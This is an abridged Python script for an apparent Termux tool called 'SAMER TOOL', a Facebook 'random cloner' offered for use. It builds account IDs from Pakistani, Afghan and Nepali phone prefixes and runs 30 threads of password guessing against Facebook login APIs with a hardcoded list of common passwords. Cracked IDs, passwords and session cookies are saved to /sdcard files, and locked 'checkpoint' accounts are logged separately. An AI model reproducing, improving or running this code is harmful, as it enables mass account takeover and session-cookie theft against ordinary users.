...
try:
    prox= requests.get('https://github.com/samerhoni001/SmR/blob/main/T.txt').text
...
android_models=[]
try:
    xx = requests.get('https://github.com/samerhoni001/SmR/blob/main/T.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
try:
    xd=requests.get('https://github.com/samerhoni001/SmR/blob/main/T.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
\x1b[1;97m [\x1b[1;91m•\x1b[1;97m] \x1b[1;97m Facebook:  SAMER KHANOO
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     SAMER TOOL PASSWORD MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m  SAMER TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                ...
                                print('\033[1;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/SAMER-COOKIE.txt') 
                                print('\033[1;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/SAMER-OK.txt')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   SAMER TOOL RANDOM CLONING MENU')
                                linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/SAMERkhano71');menu()
                        elif xd in ['4','04']:
                        	     os.system('xdg-open https://chat.whatsapp.com/HjFjl6UTo3VFbT0wI7zNFN');menu()
                        elif xd in ['0','00']:
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM SAMER TOOL')
                                linex()
                                input('\033[1;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/SAMERkhano71');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE SAMER TOOL');time.sleep(2);linex();exit() 
                        else:
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  SAMER TOOL PAK RANDOM CLONER MENU')
                linex()
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SAMER:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;97mCode Teaches You How To Face Big Problems ! ')
                        print('\033[1;97mYour Mind Is Your Best Weapons ! ')
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khan123','khan12345','baloch123','baloch786','i love you','khankhan','baloch','khattak','khattak123','ali123','ali786','SAMER123']
                                SAMER.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                ...
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/SAMER-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/SAMER-rndm-OK.txt')
                linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  SAMER TOOL AFG RANDOM CLONER MENU')
                linex()
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mSAMER TOOL NEPAL RANDOM  CLONER MENU')
                linex()
                print('\t\x1b[1;92m      NEPAL SIM CODE MENU')
                linex()
                print('\033[1;32m NEPAL SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m9811,9812,9813,9814')
                linex()
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m')
                clear()
                try:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[SAMER-M1]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        SAMER=session.cookies.get_dict().keys()
                        if "c_user" in SAMER:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m[SAMER-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SAMER-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/SAMER-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SAMER:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[SAMER-CP]  '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAMER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api4(self,uid,first,last):
        global loop,oks,cps
        sys.stdout.write('\\\33[1;37m [SAMER-M4] %s|OK/%s CP/%s\33[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SAMER:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\\\33[1;32m [SAMER-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SAMER-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SAMER:
...
def api(ids,names,passlist):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SAMER] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[SAMER-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SAMER_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SAMER_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SAMER-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SAMER_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAMER-KING-M3] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[LEGEN-SAMER-OK]  '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/SAMER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [SAMER-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAMER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAMER-RANDOM] %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SAMER-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SAMER-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SAMER-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SAMER-OK] '+uid+' | '+pas+'\033[1;97m')
